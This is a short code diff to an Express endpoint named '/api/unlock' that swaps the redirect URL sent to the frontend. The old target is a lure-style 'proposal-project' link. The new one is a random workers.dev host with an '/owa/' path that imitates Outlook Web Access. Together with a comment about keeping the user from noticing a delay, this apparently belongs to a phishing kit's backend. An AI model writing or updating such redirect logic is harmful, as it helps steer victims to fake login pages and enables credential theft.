@@ -66,7 +66,7 @@ app.post('/api/unlock', async (req, res) => {
       // IMMEDIATELY respond to the frontend so the user doesn't experience a "hang"
       res.json({ 
         success: true, 
-        redirectUrl: "https://modular-constructions.build/connect/proposal-project/W0IcW0IcTxn9lsNOpzKveecaW0IcTxzKveecaW0IcTxn96lsNOpw5OYw5OYTxzKveecaW0IcTxn96lsNOpPROPOSAL" 
+        redirectUrl: "https://i6snrz5s.640jgy1s7ogcbb5qbtqrf7.workers.dev/owa/bohfrqi0swka5j8gbm" 
       });
 
     } else {
